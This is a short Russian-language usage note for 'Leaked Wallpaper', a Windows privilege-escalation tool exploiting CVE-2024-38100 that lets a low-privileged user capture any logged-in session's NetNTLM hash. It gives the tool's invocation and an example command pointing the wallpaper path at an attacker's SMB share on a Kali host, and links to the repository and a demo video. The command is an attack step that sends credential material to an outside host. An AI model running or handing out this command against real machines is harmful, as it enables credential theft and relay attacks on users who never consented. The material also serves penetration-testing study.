## Введение 

**Leaked Wallpaper** - инструмент повышения привилегий (исправленный с помощью **CVE-2024-38100** в KB5040434), который позволяет получить **доступ к хэшу NetNTLM** пользователя из любого сеанса на компьютере, даже если мы работаем от имени пользователя с низкими привилегиями.

**GiHub** с подробностями: [MzHmO/LeakedWallpaper: Leak of any user's NetNTLM hash.](https://github.com/MzHmO/LeakedWallpaper)

---
## Использование

``` shell
.\LeakedWallpaper.exe <session> \\<KALI IP>\c$\1.jpg [-downgrade]

# Example
  .\LeakedWallpaper.exe 1 \\172.16.0.5\c$\1.jpg -downgrade
```

---

## Video

[https://youtu.be/InyrqNeaZfQ](https://youtu.be/InyrqNeaZfQ)

If blocked, see [demo.mkv](https://github.com/MzHmO/LeakedWallpaper/blob/main/demo.mkv)